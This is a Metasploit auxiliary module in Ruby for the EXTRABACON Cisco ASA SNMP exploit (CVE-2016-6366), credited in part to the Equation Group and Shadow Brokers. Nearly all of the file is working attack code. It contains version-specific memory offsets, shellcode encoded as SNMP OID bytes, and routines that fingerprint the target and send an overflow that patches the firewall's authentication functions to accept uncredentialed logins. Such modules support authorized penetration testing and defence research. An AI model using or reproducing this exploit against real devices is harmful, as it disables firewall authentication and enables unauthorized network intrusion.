##
# auxiliary/admin/cisco/cisco_asa_extrabacon.rb
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Cisco

  def initialize
    super(
      'Name'        => 'Cisco ASA Authentication Bypass (EXTRABACON)',
      'Description' => %q{
          This module patches the authentication functions of a Cisco ASA
          to allow uncredentialed logins. Uses improved shellcode for payload.
        },
      'Author'      =>
        [
          'Sean Dillon <sean.dillon@risksense.com>',
          'Zachary Harding <zachary.harding@risksense.com>',
          'Nate Caroe <nate.caroe@risksense.com>',
          'Dylan Davis <dylan.davis@risksense.com>',
          'Equation Group',
          'Shadow Brokers'
        ],
      'References' =>
        [
          [ 'CVE', '2016-6366'],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp'],
        ],
      'License'     => MSF_LICENSE
    )
    register_options([
      OptEnum.new('MODE', [ true, 'Enable or disable the password auth functions', 'pass-disable', ['pass-disable', 'pass-enable']])
    ], self.class)
    deregister_options("VERSION")

    @offsets = {

      "9.2(3)" => ["29.112.29.8",      # jmp_esp_offset, 0
                   "134.115.39.9",     # saferet_offset, 1
                   "72",               # fix_ebp,        2
                   "0.128.183.9",      # pmcheck_bounds, 3
                   "16.128.183.9",     # pmcheck_offset, 4
                   "85.49.192.137",    # pmcheck_code,   5
                   "0.80.8.8",         # admauth_bounds, 6
                   "64.90.8.8",        # admauth_offset, 7
                   "85.137.229.87"],   # admauth_code,   8

      "9.2(2)8" => ["21.187.10.8", "54.245.39.9", "72", "0.240.183.9", "16.252.183.9", "85.49.192.137", "0.80.8.8", "64.90.8.8", "16.252.183.9"],
      "8.4(3)" => ["13.178.7.8", "150.219.224.8", "72", "0.192.84.9", "208.207.84.9", "85.49.192.137", "0.16.8.8", "208.23.8.8", "85.137.229.87"],
      "8.2(3)" => ["45.0.7.8", "252.42.185.8", "88", "0.96.43.9", "128.111.43.9", "85.49.192.137", "0.240.6.8", "144.241.6.8", "85.137.229.87"]
    }

  end

  def setup

  end

  def cleanup
    # Cleanup is called once for every single thread
  end

  def check
    datastore['VERSION'] = '2c' # 2c required it seems

    snmp = connect_snmp
    begin
      vers_string = snmp.get_value('1.3.6.1.2.1.47.1.1.1.1.10.1').to_s
    rescue ::Exception => e
      print_error("Error: Unable to retrieve version information")
      return Exploit::CheckCode::Unknown
    end

    if @offsets[vers_string]
      print_status("Payload for Cisco ASA version #{vers_string} available")
      return Exploit::CheckCode::Appears
    end

    print_warning("Received Cisco ASA version #{vers_string}, but no payload available")
    return Exploit::CheckCode::Detected
  end

  def build_offsets(vers_string, mode)
      if mode == 'pass-disable'
          always_return_true = "49.192.64.195"
          pmcheck_bytes = always_return_true
          admauth_bytes = always_return_true
      else
          pmcheck_bytes = @offsets[vers_string][5]
          admauth_bytes = @offsets[vers_string][8]
      end

      preamble_snmp = ""
      preamble_snmp += "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
      preamble_snmp += @offsets[vers_string][3]
      preamble_snmp += ".205.128.88.187."
      preamble_snmp += @offsets[vers_string][6]
      preamble_snmp += ".205.128.199.5."
      preamble_snmp += @offsets[vers_string][4]
      preamble_snmp += "."
      preamble_snmp += pmcheck_bytes
      preamble_snmp += ".199.5."
      preamble_snmp += @offsets[vers_string][7]
      preamble_snmp += "."
      preamble_snmp += admauth_bytes
      preamble_snmp += ".97.104."
      preamble_snmp += @offsets[vers_string][1]
      preamble_snmp += ".128.195.16.191.11.15.15.15.137.229.131.197."
      preamble_snmp += @offsets[vers_string][2]
      preamble_snmp += ".195"

      wrapper = preamble_snmp

      wrapper_len = wrapper.split('.').length
      wrapper += ".144" * (82 - wrapper_len)

      # cufwUrlfServerStatus
      head = "1.3.6.1.4.1.9.9.491.1.3.3.1.1.5."

      head += "9.95"
      finder_snmp = "139.124.36.20.139.7.255.224.144"

      overflow = [head, wrapper, @offsets[vers_string][0], finder_snmp].join(".")
      return overflow
  end

  def run()

    begin
      datastore['VERSION'] = '2c' # 2c required it seems
      mode = datastore['MODE']

      session = rand(255) + 1

      snmp = connect_snmp

      vers_string = snmp.get_value('1.3.6.1.2.1.47.1.1.1.1.10.1').to_s

      print_status("Building payload for #{mode}...")

      overflow = build_offsets(vers_string, mode)
      payload = SNMP::ObjectId.new(overflow)

      print_status("Sending SNMP payload...")

      response = snmp.get_bulk(0, 1, [SNMP::VarBind.new(payload)])

      if response.varbind_list
        print_good("Clean return detected!")
        if mode == 'pass-disable'
          print_warning("Don't forget to run pass-enable after logging in!")
        end
      end

    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
      print_error("SNMP Error, Cisco ASA may have crashed :/")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
  end

end
